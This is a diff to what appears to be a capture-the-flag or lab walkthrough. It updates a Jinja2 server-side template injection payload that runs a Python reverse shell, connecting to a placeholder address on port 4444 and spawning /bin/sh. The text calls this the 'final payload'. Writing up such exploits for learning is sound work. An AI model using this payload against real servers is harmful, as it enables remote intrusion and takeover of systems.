@@ -89,7 +89,7 @@ pty.spawn("/bin/sh") # spawn a shell on your terminal
 put this code (without the # comments) in the popen() function, calling the script using "python3 -c". This should be your final payload:
 
 ```
-{{request.application.__globals__.__builtins__.__import__('os').popen('python -c '\ import socket, os, pty; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("x.x.x.x", 4444)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); pty.spawn("/bin/sh"); \'').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('python3 -c '\ import socket, os, pty; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("x.x.x.x", 4444)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); pty.spawn("/bin/sh"); \'').read()}}
 ```
 
 ## Shell and privesc
